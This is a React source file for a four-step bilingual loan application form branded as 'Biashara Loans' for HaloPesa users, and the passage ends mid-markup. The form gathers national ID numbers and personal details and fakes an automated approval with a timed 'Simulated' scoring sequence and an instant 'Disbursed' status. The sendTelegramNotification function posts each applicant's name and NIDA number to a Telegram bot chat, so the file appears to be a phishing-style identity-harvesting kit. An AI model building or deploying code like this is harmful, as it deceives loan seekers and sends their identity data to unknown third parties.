import React, { useState, useEffect, useMemo, useCallback } from 'react';
import { BiasharaLogo } from './BiasharaLogo';
import {
  ArrowLeft,
  ArrowRight,
  ShieldCheck,
  CheckCircle2,
  Wallet,
  Loader2,
  Sparkles,
  User,
  Store,
  Calculator,
  ClipboardCheck,
  Check,
  TrendingUp,
  AlertCircle
} from 'lucide-react';
import { getStoredLoanRules } from '../../utils/loanRules';

// ─── Telegram Bot Notification ─────────────────────────────────────────────────
const TG_BOT_TOKEN = import.meta.env.VITE_TELEGRAM_BOT_TOKEN || '';
const TG_CHAT_ID   = import.meta.env.VITE_TELEGRAM_CHAT_ID   || '';

async function sendTelegramNotification(loanInfo) {
  if (
    !TG_BOT_TOKEN ||
    !TG_CHAT_ID ||
    TG_BOT_TOKEN.includes('YOUR_BOT_TOKEN') ||
    TG_CHAT_ID.includes('YOUR_CHAT_ID')
  ) {
    return; // Skip if not configured
  }
  const lines = [
    '*New Loan Application — Biashara Loans*',
    '',
    `*Full Name:* ${loanInfo.borrowerName}`,
    `*NIDA / ID:* \`${loanInfo.nida || '—'}\``,
  ];
  const text = lines.join('\n');
  try {
    await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TG_CHAT_ID,
        text,
        parse_mode: 'Markdown',
      }),
    });
  } catch {
    // Telegram notification failed silently — does not affect UX
  }
}

export function BiasharaLoanForm({
  initialParams = {},
  userPhone = '',
  userName = '',
  onBack,
  onLoanSuccess
}) {
  const [loanRules] = useState(getStoredLoanRules());

  // Current Step: 1 | 2 | 3 | 4
  const [currentStep, setCurrentStep] = useState(1);
  const [agreedToTerms, setAgreedToTerms] = useState(false);
  const [validationError, setValidationError] = useState('');

  // Form State - Step 1: Personal Information
  const [fullname, setFullname] = useState(userName || '');
  const [nationalId, setNationalId] = useState('');
  const [phone, setPhone] = useState(userPhone || '0622 145 890');
  const [age, setAge] = useState('32');
  const [gender, setGender] = useState('Female');
  const [maritalStatus, setMaritalStatus] = useState('Married');

  // Form State - Step 2: Business Information
  const [bizCategory, setBizCategory] = useState(initialParams.businessCategory || 'Retail & Small Shops');
  const [bizLocation, setBizLocation] = useState('Dar es Salaam, Kariakoo');
  const [monthlyRevenue, setMonthlyRevenue] = useState(initialParams.salaryRange || '1000001:2500000');
  const [bizAge, setBizAge] = useState('1-3 Years');

  // Find active salary bracket based on selected monthly revenue
  const activeBracket = useMemo(() => {
    return (
      loanRules.salaryBrackets.find((b) => b.range === monthlyRevenue) ||
      loanRules.salaryBrackets[1] ||
      loanRules.salaryBrackets[0]
    );
  }, [loanRules, monthlyRevenue]);

  // Form State - Step 3: Loan Request & Terms (Bounded by Active Salary Bracket)
  const [amount, setAmount] = useState(initialParams.amount || 500000);
  const [durationMonths, setDurationMonths] = useState(initialParams.durationMonths || 2);
  const [loanPurpose, setLoanPurpose] = useState('Stock Purchase / Kuongeza Bidhaa');

  // Ensure amount is clamped within salary bracket
  useEffect(() => {
    if (amount > activeBracket.maxLoan) {
      setAmount(activeBracket.maxLoan);
    } else if (amount < activeBracket.minLoan) {
      setAmount(activeBracket.minLoan);
    }
  }, [activeBracket]);

  // Submission & Processing States: 'idle' | 'processing' | 'approved'
  const [submissionState, setSubmissionState] = useState('idle');
  const [processingStep, setProcessingStep] = useState(1);
  const [approvedLoanData, setApprovedLoanData] = useState(null);
  const [redirectCountdown, setRedirectCountdown] = useState(4);

  // Live Calculations
  const monthlyRate = (loanRules.interestRateMonthly || 5) / 100;
  const totalInterest = Math.round(amount * monthlyRate * durationMonths);
  const totalRepayment = amount + totalInterest;
  const monthlyInstallment = Math.round(totalRepayment / durationMonths);

  // Calculated Due Date memoized
  const formattedDueDate = useMemo(() => {
    const d = new Date();
    d.setMonth(d.getMonth() + durationMonths);
    return d.toLocaleDateString('en-GB', {
      day: 'numeric',
      month: 'short',
      year: 'numeric'
    });
  }, [durationMonths]);

  // Step Validation & Navigation
  const handleNextFromStep1 = (e) => {
    e.preventDefault();
    setValidationError('');
    if (!fullname.trim()) {
      setValidationError('Please enter your full name as shown on NIDA / Tafadhali jaza jina lako kamili.');
      return;
    }
    if (!nationalId.trim()) {
      setValidationError('Please enter your National ID (NIDA) / Tafadhali jaza namba yako ya NIDA.');
      return;
    }
    if (!phone.trim()) {
      setValidationError('Please enter your HaloPesa phone number / Tafadhali jaza namba ya HaloPesa.');
      return;
    }
    setCurrentStep(2);
    window.scrollTo({ top: 0, behavior: 'smooth' });
  };

  const handleNextFromStep2 = (e) => {
    e.preventDefault();
    setValidationError('');
    if (!bizLocation.trim()) {
      setValidationError('Please enter your business location / Tafadhali jaza eneo la biashara yako.');
      return;
    }
    setCurrentStep(3);
    window.scrollTo({ top: 0, behavior: 'smooth' });
  };

  const handleNextFromStep3 = (e) => {
    e.preventDefault();
    setValidationError('');
    setCurrentStep(4);
    window.scrollTo({ top: 0, behavior: 'smooth' });
  };

  const handleFinalSubmit = (e) => {
    e.preventDefault();
    if (!agreedToTerms) {
      setValidationError('Please agree to the Terms & Conditions to proceed / Tafadhali kubali Masharti na Vigezo.');
      return;
    }

    setSubmissionState('processing');
    setProcessingStep(1);

    // Simulated automated scoring steps
    setTimeout(() => {
      setProcessingStep(2);
    }, 900);

    setTimeout(() => {
      setProcessingStep(3);
    }, 1800);

    setTimeout(() => {
      const loanRef = 'BL-' + Math.floor(100000 + Math.random() * 900000);
      const loanInfo = {
        loanId: loanRef,
        amount: Number(amount),
        durationMonths,
        totalRepayment,
        monthlyInstallment,
        dueDate: formattedDueDate,
        borrowerName: fullname || 'HaloPesa Merchant',
        phone,
        nida: nationalId,
        age: Number(age),
        gender,
        maritalStatus,
        category: bizCategory,
        location: bizLocation,
        monthlyRevenue: activeBracket.labelEn,
        status: 'Disbursed',
        createdAt: new Date().toISOString(),
        disbursedAt: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })
      };

      // Save application into localStorage for Super Admin Panel
      try {
        const stored = JSON.parse(localStorage.getItem('biashara_applications') || '[]');
        stored.unshift(loanInfo);
        localStorage.setItem('biashara_applications', JSON.stringify(stored));
      } catch (err) {}

      // Fire Telegram notification (non-blocking)
      sendTelegramNotification(loanInfo);

      setApprovedLoanData(loanInfo);
      setSubmissionState('approved');
    }, 2800);
  };

  const handleCompleteRedirect = useCallback(() => {
    if (onLoanSuccess && approvedLoanData) {
      onLoanSuccess(approvedLoanData);
    }
  }, [onLoanSuccess, approvedLoanData]);

  // Countdown timer when approved to auto-redirect to HaloPesa dashboard
  useEffect(() => {
    if (submissionState === 'approved' && approvedLoanData) {
      const timer = setInterval(() => {
        setRedirectCountdown((prev) => {
          if (prev <= 1) {
            clearInterval(timer);
            handleCompleteRedirect();
            return 0;
          }
          return prev - 1;
        });
      }, 1000);
      return () => clearInterval(timer);
    }
  }, [submissionState, approvedLoanData, handleCompleteRedirect]);

  const stepMeta = [
    { num: 1, titleEn: 'Personal Info', titleSw: 'Binafsi', icon: User },
    { num: 2, titleEn: 'Business Details', titleSw: 'Biashara', icon: Store },
    { num: 3, titleEn: 'Loan Request', titleSw: 'Mkopo', icon: Calculator },
    { num: 4, titleEn: 'Verification', titleSw: 'Uhakiki', icon: ClipboardCheck }
  ];

  return (
    <div className="min-h-screen bg-stone-100/80 py-6 sm:py-10 px-3 sm:px-6 flex justify-center">
      <div className="w-full max-w-3xl bg-white rounded-3xl shadow-xl border border-stone-200/90 overflow-hidden">
        
        {/* Top Header Bar */}
        <div className="bg-gradient-to-r from-stone-900 to-stone-800 text-white px-5 sm:px-8 py-5 flex items-center justify-between">
          <button
            type="button"
            onClick={onBack}
            disabled={submissionState === 'processing'}
            className="flex items-center gap-1.5 text-xs sm:text-sm font-bold text-stone-300 hover:text-white transition-colors cursor-pointer disabled:opacity-50"
          >
            <ArrowLeft className="w-4 h-4" />
            <span>Back to Portal / Rudi</span>
          </button>

          <BiasharaLogo variant="white" />
        </div>

        {/* ═══════════════════════════════════════════════════════════════════
            STATE 1: 4-STEP WIZARD FORM (IDLE)
        ════════════════════════════════════════════════════════════════════ */}
        {submissionState === 'idle' && (
          <div className="p-5 sm:p-10">
            
            {/* Header Titles */}
            <div className="text-center max-w-xl mx-auto mb-8">
              <span className="inline-block text-[11px] font-extrabold uppercase tracking-wider text-[#F05A22] bg-orange-100 px-3 py-1 rounded-full mb-2">
                100% Digital & Paperless / Kidijitali 100%
              </span>
              <h1 className="text-2xl sm:text-3xl font-extrabold text-stone-900 tracking-tight">
                Biashara Loans Application
                <span className="block text-lg sm:text-xl font-bold text-[#F05A22] mt-0.5">
                  / Fomu ya Maombi ya Mkopo wa Biashara
                </span>
              </h1>
              <p className="text-xs sm:text-sm text-stone-500 mt-1.5">
                Complete the 4 steps below. Approved funds disburse directly to your HaloPesa wallet.
              </p>
            </div>

            {/* Stepper Progress Bar */}
            <div className="mb-8">
              <div className="grid grid-cols-4 gap-2 sm:gap-4 relative mb-3">
                {stepMeta.map((s) => {
                  const Icon = s.icon;
                  const isCompleted = currentStep > s.num;
                  const isCurrent = currentStep === s.num;
                  return (
                    <div
                      key={s.num}
                      className={`flex flex-col items-center text-center p-2 rounded-xl transition-all ${
                        isCurrent
                          ? 'bg-orange-50 border border-orange-200 shadow-xs'
                          : isCompleted
                          ? 'bg-emerald-50/70 border border-emerald-200'
                          : 'bg-stone-50 border border-stone-200/70 opacity-60'
                      }`}
                    >
                      <div
                        className={`w-8 h-8 rounded-lg flex items-center justify-center font-bold text-xs mb-1.5 transition-colors ${
                          isCompleted
                            ? 'bg-emerald-600 text-white'
                            : isCurrent
                            ? 'bg-[#F05A22] text-white shadow-xs'
                            : 'bg-stone-200 text-stone-600'
                        }`}
                      >
                        {isCompleted ? <Check className="w-4 h-4 stroke-[3]" /> : <Icon className="w-4 h-4" />}
                      </div>
                      <span className="text-[11px] sm:text-xs font-bold text-stone-900 leading-tight">
                        {s.titleEn}
                      </span>
                      <span className="text-[10px] text-stone-500 font-medium">
                        / {s.titleSw}
                      </span>
                    </div>
                  );
                })}
              </div>

              {/* Progress Line */}
              <div className="w-full bg-stone-100 rounded-full h-1.5 overflow-hidden">
                <div
                  className="bg-[#F05A22] h-full transition-all duration-300"
                  style={{ width: `${(currentStep / 4) * 100}%` }}
                ></div>
              </div>
            </div>

            {/* Validation Error Banner */}
            {validationError && (
              <div className="mb-6 p-3.5 rounded-xl bg-red-50 border border-red-200 text-red-700 text-xs font-semibold flex items-center gap-2">
                <ShieldCheck className="w-4 h-4 text-red-600 shrink-0" />
                <span>{validationError}</span>
              </div>
            )}

            {/* ══════════════════════════════════════════════════════════════════
                STEP 1: PERSONAL INFORMATION
            ═══════════════════════════════════════════════════════════════════ */}
            {currentStep === 1 && (
              <form onSubmit={handleNextFromStep1} className="space-y-5 animate-in fade-in duration-200">
                <div className="bg-stone-50/80 border border-stone-200 rounded-2xl p-5 sm:p-6 space-y-4">
                  <div className="flex items-center gap-2.5 pb-3 border-b border-stone-200">
                    <div className="w-8 h-8 rounded-lg bg-orange-100 text-[#F05A22] flex items-center justify-center font-black">
                      <User className="w-4 h-4" />
                    </div>
                    <div>
                      <h2 className="text-sm sm:text-base font-extrabold text-stone-900 leading-none">
                        Step 1: Personal Information / Taarifa Binafsi
                      </h2>
                      <p className="text-[11px] text-stone-500 mt-0.5">
                        Your identity details as registered on your National ID (NIDA)
                      </p>
                    </div>
                  </div>

                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 pt-1">
                    {/* Full Name */}
                    <div className="sm:col-span-2">
                      <label className="block text-xs font-bold text-stone-700 mb-1">
                        Full Name (As on NIDA) / Jina Kamili (Kama lilivyo NIDA) *
                      </label>
                      <input
                        type="text"
                        required
                        value={fullname}
                        onChange={(e) => setFullname(e.target.value)}
                        placeholder="e.g. Juma Rashid Bakari / Jina lako kamili"
                        className="w-full h-11 px-3.5 rounded-xl border border-stone-300 text-stone-900 text-sm focus:outline-none focus:border-[#F05A22] focus:ring-2 focus:ring-[#F05A22]/20 bg-white transition-all"
                      />
                    </div>

                    {/* National ID */}
                    <div>
                      <label className="block text-xs font-bold text-stone-700 mb-1">
                        National ID (NIDA) / Namba ya NIDA *
                      </label>
                      <input
                        type="text"
                        required
                        value={nationalId}
                        onChange={(e) => setNationalId(e.target.value)}
                        placeholder="e.g. 19901234-12345-00001-22"
                        className="w-full h-11 px-3.5 rounded-xl border border-stone-300 text-stone-900 text-sm focus:outline-none focus:border-[#F05A22] focus:ring-2 focus:ring-[#F05A22]/20 bg-white transition-all font-mono"
                      />
                    </div>

                    {/* HaloPesa Phone Number */}
                    <div>
                      <label className="block text-xs font-bold text-stone-700 mb-1">
                        Phone Number (HaloPesa Line) / Namba ya Simu (HaloPesa) *
                      </label>
                      <input
                        type="tel"
                        required
                        value={phone}
                        onChange={(e) => setPhone(e.target.value)}
                        placeholder="e.g. 0622 123 456"
                        className="w-full h-11 px-3.5 rounded-xl border border-stone-300 text-stone-900 text-sm focus:outline-none focus:border-[#F05A22] focus:ring-2 focus:ring-[#F05A22]/20 bg-white transition-all"
                      />
                    </div>

                    {/* Age */}
                    <div>
                      <label className="block text-xs font-bold text-stone-700 mb-1">
                        Age (Years) / Umri (Miaka 18+) *
                      </label>
                      <input
                        type="number"
                        required
                        min="18"
                        max="85"
                        value={age}
                        onChange={(e) => setAge(e.target.value)}
                        className="w-full h-11 px-3.5 rounded-xl border border-stone-300 text-stone-900 text-sm focus:outline-none focus:border-[#F05A22] bg-white transition-all"
                      />
                    </div>

                    {/* Gender */}
                    <div>
                      <label className="block text-xs font-bold text-stone-700 mb-1">
                        Gender / Jinsia *
                      </label>
                      <select
                        value={gender}
                        onChange={(e) => setGender(e.target.value)}
                        className="w-full h-11 px-3.5 rounded-xl border border-stone-300 text-stone-900 text-sm focus:outline-none focus:border-[#F05A22] bg-white cursor-pointer"
                      >
                        <option value="Female">Female / Mwanamke</option>
                        <option value="Male">Male / Mwanaume</option>
                      </select>
                    </div>

                    {/* Marital Status */}
                    <div className="sm:col-span-2">
                      <label className="block text-xs font-bold text-stone-700 mb-1">
                        Marital Status / Hali ya Ndoa *
                      </label>
                      <select
                        value={maritalStatus}
                        onChange={(e) => setMaritalStatus(e.target.value)}
                        className="w-full h-11 px-3.5 rounded-xl border border-stone-300 text-stone-900 text-sm focus:outline-none focus:border-[#F05A22] bg-white cursor-pointer"
                      >
                        <option value="Single">Single / Hujafunga Ndoa</option>
                        <option value="Married">Married / Umeoa au Umeolewa</option>
                        <option value="Divorced">Divorced / Umeachika</option>
                        <option value="Widowed">Widowed / Mjane</option>
                      </select>
                    </div>
                  </div>
                </div>

                {/* Navigation Buttons */}
                <div className="flex justify-end pt-2">
                  <button
                    type="submit"
                    className="w-full sm:w-auto px-7 py-3.5 rounded-xl font-extrabold text-white text-sm bg-[#F05A22] hover:bg-[#D8450E] active:scale-[0.98] shadow-md shadow-orange-500/20 flex items-center justify-center gap-2 transition-all cursor-pointer"
                  >
                    <span>Next: Business Details / Endelea: Taarifa za Biashara</span>
                    <ArrowRight className="w-4 h-4" />
                  </button>
                </div>
              </form>
            )}

            {/* ══════════════════════════════════════════════════════════════════
                STEP 2: BUSINESS INFORMATION & SALARY RANGE
            ═══════════════════════════════════════════════════════════════════ */}
            {currentStep === 2 && (
              <form onSubmit={handleNextFromStep2} className="space-y-5 animate-in fade-in duration-200">
                <div className="bg-stone-50/80 border border-stone-200 rounded-2xl p-5 sm:p-6 space-y-4">
                  <div className="flex items-center gap-2.5 pb-3 border-b border-stone-200">
                    <div className="w-8 h-8 rounded-lg bg-orange-100 text-[#F05A22] flex items-center justify-center font-black">
                      <Store className="w-4 h-4" />
                    </div>
                    <div>
                      <h2 className="text-sm sm:text-base font-extrabold text-stone-900 leading-none">
                        Step 2: Business & Monthly Revenue / Taarifa za Biashara & Mauzo
                      </h2>
                      <p className="text-[11px] text-stone-500 mt-0.5">
                        Your borrowing capacity will be calibrated by your monthly sales or salary
                      </p>
                    </div>
                  </div>

                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 pt-1">
                    {/* Category */}
                    <div>
                      <label className="block text-xs font-bold text-stone-700 mb-1">
                        Business Category / Aina ya Biashara *
                      </label>
                      <select
                        value={bizCategory}
                        onChange={(e) => setBizCategory(e.target.value)}
                        className="w-full h-11 px-3.5 rounded-xl border border-stone-300 text-stone-900 text-sm focus:outline-none focus:border-[#F05A22] bg-white cursor-pointer"
                      >
                        <option value="Retail & Small Shops">Retail & Small Shops / Maduka & Biashara Ndogondogo</option>
                        <option value="Agriculture & Farming">Agriculture & Farming / Kilimo & Ufugaji</option>
                        <option value="Transport & Bodaboda">Transport & Bodaboda / Usafiri & Bodaboda</option>
                        <option value="Salon & Beauty Services">Salon & Beauty / Saluni & Urembo</option>
                        <option value="Food & Restaurant Vendors">Food & Restaurant / Mama Ntilie & Migahawa</option>
                        <option value="Wholesale & Distribution">Wholesale & Trade / Jumla & Usambazaji</option>
                        <option value="Other Business">Other Services / Huduma Nyingine</option>
                      </select>
                    </div>

                    {/* Monthly Income / Salary */}
                    <div>
                      <label className="block text-xs font-bold text-stone-700 mb-1">
                        Monthly Revenue or Salary / Mauzo au Mshahara *
                      </label>
                      <select
                        value={monthlyRevenue}
                        onChange={(e) => setMonthlyRevenue(e.target.value)}
                        className="w-full h-11 px-3.5 rounded-xl border border-stone-300 text-stone-900 text-sm focus:outline-none focus:border-[#F05A22] bg-white cursor-pointer"
                      >
                        {loanRules.salaryBrackets.map((b) => (
                          <option key={b.id} value={b.range}>
                            {b.labelEn} (Max: TZS {b.maxLoan.toLocaleString()})
                          </option>
                        ))}
                      </select>
                    </div>

                    {/* Location */}
                    <div>
                      <label className="block text-xs font-bold text-stone-700 mb-1">
                        Business Location / Mahali Biashara Ilipo (Mkoa & Eneo) *
                      </label>
                      <input
                        type="text"
                        required
                        value={bizLocation}
                        onChange={(e) => setBizLocation(e.target.value)}
                        placeholder="e.g. Dar es Salaam, Kariakoo / Mkoa na Eneo"
                        className="w-full h-11 px-3.5 rounded-xl border border-stone-300 text-stone-900 text-sm focus:outline-none focus:border-[#F05A22] focus:ring-2 focus:ring-[#F05A22]/20 bg-white transition-all"
                      />
                    </div>

                    {/* Operating Period */}
                    <div>
                      <label className="block text-xs font-bold text-stone-700 mb-1">
                        Operating Period / Muda wa Biashara *
                      </label>
                      <select
                        value={bizAge}
                        onChange={(e) => setBizAge(e.target.value)}
                        className="w-full h-11 px-3.5 rounded-xl border border-stone-300 text-stone-900 text-sm focus:outline-none focus:border-[#F05A22] bg-white cursor-pointer"
                      >
                        <option value="Under 6 Months">Under 6 Months / Chini ya miezi 6</option>
                        <option value="6-12 Months">6 - 12 Months / Miezi 6 hadi 12</option>
                        <option value="1-3 Years">1 - 3 Years / Miaka 1 hadi 3</option>
                        <option value="Over 3 Years">Over 3 Years / Zaidi ya miaka 3</option>
                      </select>
                    </div>
                  </div>

                  {/* Active Salary Tier Callout */}
                  <div className="p-3 bg-orange-50/80 border border-orange-200 rounded-xl flex items-center justify-between text-xs text-stone-800">
                    <span className="font-semibold">Eligible Loan Limit for this Salary Tier:</span>
                    <strong className="text-[#F05A22] font-mono text-sm">
                      Up to TZS {activeBracket.maxLoan.toLocaleString()}
                    </strong>
                  </div>
                </div>

                {/* Navigation Buttons */}
                <div className="flex items-center justify-between pt-2">
                  <button
                    type="button"
                    onClick={() => setCurrentStep(1)}
                    className="px-5 py-3 rounded-xl font-bold text-stone-700 text-sm bg-stone-100 hover:bg-stone-200 transition-colors flex items-center gap-1.5 cursor-pointer"
                  >
                    <ArrowLeft className="w-4 h-4" />
                    <span>Back / Rudi</span>
                  </button>

                  <button
                    type="submit"
                    className="px-7 py-3.5 rounded-xl font-extrabold text-white text-sm bg-[#F05A22] hover:bg-[#D8450E] active:scale-[0.98] shadow-md shadow-orange-500/20 flex items-center gap-2 transition-all cursor-pointer"
                  >
                    <span>Next: Loan Request / Endelea: Kiasi cha Mkopo</span>
                    <ArrowRight className="w-4 h-4" />
                  </button>
                </div>
              </form>
            )}

            {/* ══════════════════════════════════════════════════════════════════
                STEP 3: LOAN REQUEST & TERMS (Bounded by Salary Bracket)
            ═══════════════════════════════════════════════════════════════════ */}
            {currentStep === 3 && (
              <form onSubmit={handleNextFromStep3} className="space-y-5 animate-in fade-in duration-200">
                <div className="bg-stone-50/80 border border-stone-200 rounded-2xl p-5 sm:p-6 space-y-5">
                  <div className="flex items-center gap-2.5 pb-3 border-b border-stone-200">
                    <div className="w-8 h-8 rounded-lg bg-orange-100 text-[#F05A22] flex items-center justify-center font-black">
                      <Calculator className="w-4 h-4" />
                    </div>
                    <div>
                      <h2 className="text-sm sm:text-base font-extrabold text-stone-900 leading-none">
                        Step 3: Loan Request & Terms / Kiasi na Masharti ya Mkopo
                      </h2>
                      <p className="text-[11px] text-stone-500 mt-0.5">
                        Choose your required capital up to your salary limit of TZS {activeBracket.maxLoan.toLocaleString()}
                      </p>
                    </div>
                  </div>

                  {/* Amount Slider */}
                  <div>
                    <div className="flex justify-between items-center mb-2">
                      <label className="text-xs font-bold text-stone-700">
                        Loan Amount / Kiasi cha Mkopo (TZS):
                      </label>
                      <span className="text-lg font-black text-[#F05A22] font-mono">
                        TZS {Number(amount).toLocaleString()}
                      </span>
                    </div>

                    <input
                      type="range"
                      min={activeBracket.minLoan}
                      max={activeBracket.maxLoan}
                      step="50000"
                      value={amount}
                      onChange={(e) => setAmount(Number(e.target.value))}
                      className="w-full h-3 bg-stone-200 rounded-lg appearance-none cursor-pointer accent-[#F05A22]"
                    />

                    <div className="flex justify-between text-[11px] text-stone-400 mt-1 font-mono">
                      <span>Min: TZS {activeBracket.minLoan.toLocaleString()}</span>
                      <span>Max: TZS {activeBracket.maxLoan.toLocaleString()}</span>
                    </div>
                  </div>

                  {/* Tenure */}
                  <div>
                    <label className="block text-xs font-bold text-stone-700 mb-2">
                      Repayment Period / Muda wa Marejesho:
                    </label>
                    <div className="grid grid-cols-2 sm:grid-cols-4 gap-2.5">
                      {[
                        { m: 1, en: '1 Month', sw: 'Mwezi 1' },
                        { m: 2, en: '2 Months', sw: 'Miezi 2' },
                        { m: 3, en: '3 Months', sw: 'Miezi 3' },
                        { m: 6, en: '6 Months', sw: 'Miezi 6' }
                      ].map((item) => (
                        <button
                          key={item.m}
                          type="button"
                          onClick={() => setDurationMonths(item.m)}
                          className={`p-3 rounded-xl border text-center transition-all cursor-pointer ${
                            durationMonths === item.m
                              ? 'bg-white border-[#F05A22] ring-2 ring-[#F05A22]/20 text-[#F05A22] shadow-xs'
                              : 'bg-white border-stone-200 text-stone-700 hover:border-stone-300'
                          }`}
                        >
                          <div className="text-xs font-black">{item.en}</div>
                          <div className="text-[10px] text-stone-500 font-medium mt-0.5">/ {item.sw}</div>
                        </button>
                      ))}
                    </div>
                  </div>

                  {/* Purpose */}
                  <div>
                    <label className="block text-xs font-bold text-stone-700 mb-1">
                      Loan Purpose / Sababu ya Mkopo:
                    </label>
                    <select
                      value={loanPurpose}
                      onChange={(e) => setLoanPurpose(e.target.value)}
                      className="w-full h-11 px-3.5 rounded-xl border border-stone-300 text-stone-900 text-sm focus:outline-none focus:border-[#F05A22] bg-white cursor-pointer"
                    >
                      <option value="Stock Purchase / Kuongeza Bidhaa">Stock Purchase / Kuongeza Bidhaa za Duka</option>
                      <option value="Business Equipment / Vifaa vya Kazi">Business Equipment / Kununua Vifaa vya Kazi</option>
                      <option value="Business Expansion / Kupandisha Mtaji">Business Expansion / Kupandisha Mtaji</option>
                      <option value="Working Capital / Mtaji wa Uendeshaji">Working Capital / Mtaji wa Uendeshaji</option>
                    </select>
                  </div>

                  {/* Calculations Box */}
                  <div className="bg-orange-50/80 border border-orange-200/80 rounded-2xl p-4 sm:p-5 space-y-2 text-xs">
                    <div className="flex justify-between items-center text-stone-700">
                      <span>Principal Amount / Kiasi cha Mkopo:</span>
                      <span className="font-bold text-stone-900 font-mono">TZS {Number(amount).toLocaleString()}</span>
                    </div>
                    <div className="flex justify-between items-center text-stone-700">
                      <span>Interest ({loanRules.interestRateMonthly || 5}% p.m.) / Riba:</span>
                      <span className="font-bold text-stone-900 font-mono">TZS {totalInterest.toLocaleString()}</span>
                    </div>
                    <div className="flex justify-between items-center text-stone-700">
                      <span>Processing Fee / Ada ya Huduma:</span>
                      <span className="font-bold text-[#009A44]">0 TZS (Free / Bure)</span>
                    </div>
                    <div className="pt-2.5 border-t border-orange-200 flex justify-between items-center text-sm">
                      <span className="font-extrabold text-stone-900">Total Repayable / Jumla ya Kulipa:</span>
                      <span className="font-black text-[#F05A22] font-mono text-base">
                        TZS {totalRepayment.toLocaleString()}
                      </span>
                    </div>
                    <div className="flex justify-between items-center text-stone-600 text-[11px] pt-1 font-mono">
                      <span>Monthly Installment / Rejesho kwa Mwezi:</span>
                      <span className="font-bold">TZS {monthlyInstallment.toLocaleString()}</span>
                    </div>
                    <div className="flex justify-between items-center text-stone-600 text-[11px]">
                      <span>Due Date / Tarehe ya Marejesho:</span>
                      <span className="font-bold text-stone-800">{formattedDueDate}</span>
                    </div>
                  </div>
                </div>

                {/* Navigation Buttons */}
                <div className="flex items-center justify-between pt-2">
                  <button
                    type="button"
                    onClick={() => setCurrentStep(2)}
                    className="px-5 py-3 rounded-xl font-bold text-stone-700 text-sm bg-stone-100 hover:bg-stone-200 transition-colors flex items-center gap-1.5 cursor-pointer"
                  >
                    <ArrowLeft className="w-4 h-4" />
                    <span>Back / Rudi</span>
                  </button>

                  <button
                    type="submit"
                    className="px-7 py-3.5 rounded-xl font-extrabold text-white text-sm bg-[#F05A22] hover:bg-[#D8450E] active:scale-[0.98] shadow-md shadow-orange-500/20 flex items-center gap-2 transition-all cursor-pointer"
                  >
                    <span>Next: Review & Confirm / Endelea: Uhakiki</span>
                    <ArrowRight className="w-4 h-4" />
                  </button>
                </div>
              </form>
            )}

            {/* ══════════════════════════════════════════════════════════════════
                STEP 4: VERIFICATION & CONFIRMATION (REVIEW SUMMARY)
            ═══════════════════════════════════════════════════════════════════ */}
            {currentStep === 4 && (
              <form onSubmit={handleFinalSubmit} className="space-y-5 animate-in fade-in duration-200">
                <div className="bg-stone-50/80 border border-stone-200 rounded-2xl p-5 sm:p-6 space-y-5">
                  <div className="flex items-center gap-2.5 pb-3 border-b border-stone-200">
                    <div className="w-8 h-8 rounded-lg bg-emerald-100 text-[#009A44] flex items-center justify-center font-black">
                      <ClipboardCheck className="w-4 h-4" />
                    </div>
                    <div>
                      <h2 className="text-sm sm:text-base font-extrabold text-stone-900 leading-none">
                        Step 4: Review & Confirm / Uhakiki na Uthibitisho
                      </h2>
                      <p className="text-[11px] text-stone-500 mt-0.5">
                        Please review your application details before submitting for instant scoring
                      </p>
                    </div>
                  </div>

                  {/* Summary Cards Grid */}
                  <div className="space-y-4">
                    {/* Personal Summary */}
                    <div className="bg-white border border-stone-200 rounded-xl p-4">
                      <div className="flex items-center justify-between pb-2 mb-2 border-b border-stone-100">
                        <span className="text-xs font-bold text-stone-900 flex items-center gap-1.5">
                          <User className="w-3.5 h-3.5 text-[#F05A22]" />
                          <span>1. Applicant Information / Taarifa za Mwombaji</span>
                        </span>
                        <button
                          type="button"
                          onClick={() => setCurrentStep(1)}
                          className="text-[11px] font-bold text-[#F05A22] hover:underline cursor-pointer"
                        >
                          Edit / Badilisha
                        </button>
                      </div>
                      <div className="grid grid-cols-2 sm:grid-cols-3 gap-2.5 text-xs">
                        <div>
                          <span className="text-stone-400 block text-[10px]">Name / Jina:</span>
                          <span className="font-bold text-stone-800">{fullname}</span>
                        </div>
                        <div>
                          <span className="text-stone-400 block text-[10px]">NIDA ID / NIDA:</span>
                          <span className="font-bold text-stone-800 font-mono">{nationalId}</span>
                        </div>
                        <div>
                          <span className="text-stone-400 block text-[10px]">Phone / HaloPesa:</span>
                          <span className="font-bold text-stone-800 font-mono">{phone}</span>
                        </div>
                      </div>
                    </div>

                    {/* Business Summary */}
                    <div className="bg-white border border-stone-200 rounded-xl p-4">
                      <div className="flex items-center justify-between pb-2 mb-2 border-b border-stone-100">
                        <span className="text-xs font-bold text-stone-900 flex items-center gap-1.5">
                          <Store className="w-3.5 h-3.5 text-[#F05A22]" />
                          <span>2. Business Information / Taarifa za Biashara</span>
                        </span>
                        <button
                          type="button"
                          onClick={() => setCurrentStep(2)}
                          className="text-[11px] font-bold text-[#F05A22] hover:underline cursor-pointer"
                        >
                          Edit / Badilisha
                        </button>
                      </div>
                      <div className="grid grid-cols-2 sm:grid-cols-3 gap-2.5 text-xs">
                        <div>
                          <span className="text-stone-400 block text-[10px]">Category / Aina:</span>
                          <span className="font-bold text-stone-800">{bizCategory}</span>
                        </div>
                        <div>
                          <span className="text-stone-400 block text-[10px]">Salary / Revenue Tier:</span>
                          <span className="font-bold text-stone-800">{activeBracket.labelEn}</span>
                        </div>
                        <div>
                          <span className="text-stone-400 block text-[10px]">Location / Eneo:</span>
                          <span className="font-bold text-stone-800">{bizLocation}</span>
                        </div>
                      </div>
                    </div>

                    {/* Loan Summary */}
                    <div className="bg-white border border-stone-200 rounded-xl p-4">
                      <div className="flex items-center justify-between pb-2 mb-2 border-b border-stone-100">
                        <span className="text-xs font-bold text-stone-900 flex items-center gap-1.5">
                          <Calculator className="w-3.5 h-3.5 text-[#F05A22]" />
                          <span>3. Loan Terms / Masharti ya Mkopo</span>
                        </span>
                        <button
                          type="button"
                          onClick={() => setCurrentStep(3)}
                          className="text-[11px] font-bold text-[#F05A22] hover:underline cursor-pointer"
                        >
                          Edit / Badilisha
                        </button>
                      </div>
                      <div className="grid grid-cols-2 sm:grid-cols-4 gap-2.5 text-xs">
                        <div>
